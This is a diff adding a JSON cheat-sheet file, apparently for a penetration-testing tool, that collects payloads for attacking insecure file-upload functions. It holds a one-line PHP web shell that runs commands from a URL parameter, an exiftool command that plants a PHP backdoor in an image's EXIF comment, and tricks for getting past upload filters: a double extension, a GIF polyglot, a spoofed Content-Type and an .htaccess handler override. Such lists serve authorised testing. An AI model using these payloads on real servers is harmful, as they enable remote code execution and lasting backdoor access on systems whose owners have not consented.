@@ -1,0 +1,30 @@
+{
+  "category": "File-Upload & WebShells",
+  "description": "Payloads & bypass tricks for insecure upload functions",
+  "cheats": [
+    {
+      "title": "PentestMonkey PHP shell",
+      "content": "<?php system($_GET['cmd']); ?>"
+    },
+    {
+      "title": "Double extension bypass",
+      "content": "shell.php.jpg"
+    },
+    {
+      "title": "GIF89a polyglot",
+      "content": "GIF89a;<?php ... ?>"
+    },
+    {
+      "title": "Content-Type spoof (burp)",
+      "content": "Content-Type: image/jpeg"
+    },
+    {
+      "title": "Add .htaccess to force PHP engine",
+      "content": "SetHandler application/x-httpd-php"
+    },
+    {
+      "title": "EXIF injection (PHP backdoor)",
+      "content": "exiftool -Comment='<?php system($_GET[0]); ?>' avatar.jpg"
+    }
+  ]
+}
